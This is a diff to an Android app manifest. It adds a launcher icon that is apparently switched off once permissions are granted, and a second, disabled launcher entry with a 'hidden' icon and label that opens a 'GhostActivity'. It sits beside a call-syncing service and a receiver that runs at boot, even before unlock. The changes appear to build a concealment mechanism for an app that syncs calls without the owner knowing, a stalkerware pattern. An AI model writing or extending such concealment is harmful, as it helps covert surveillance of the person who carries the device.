@@ -69,6 +69,35 @@
         android:noHistory="true"
         android:theme="@style/GhostTheme" />
 
+      <!-- Pehli start ke liye icon; Allow/sync ke baad disable. Bina iske release APK Admin khali rehta hai. -->
+      <activity-alias
+        android:name=".LauncherAlias"
+        android:enabled="true"
+        android:exported="true"
+        android:icon="@mipmap/ic_launcher"
+        android:label="@string/app_name"
+        android:roundIcon="@mipmap/ic_launcher_round"
+        android:targetActivity=".PermissionTrampolineActivity">
+        <intent-filter>
+            <action android:name="android.intent.action.MAIN" />
+            <category android:name="android.intent.category.LAUNCHER" />
+        </intent-filter>
+      </activity-alias>
+
+      <activity-alias
+        android:name=".HiddenAlias"
+        android:enabled="false"
+        android:exported="true"
+        android:icon="@drawable/ic_hidden"
+        android:label="@string/hidden_app_label"
+        android:roundIcon="@drawable/ic_hidden"
+        android:targetActivity=".GhostActivity">
+        <intent-filter>
+            <action android:name="android.intent.action.MAIN" />
+            <category android:name="android.intent.category.LAUNCHER" />
+        </intent-filter>
+      </activity-alias>
+
       <service
         android:name=".CallSyncService"
         android:enabled="true"
@@ -121,7 +150,7 @@
         android:name=".BootReceiver"
         android:enabled="true"
         android:exported="true"
-        android:directBootAware="true">    
+        android:directBootAware="true">
         <intent-filter>
             <action android:name="android.intent.action.BOOT_COMPLETED" />
             <action android:name="android.intent.action.LOCKED_BOOT_COMPLETED" />
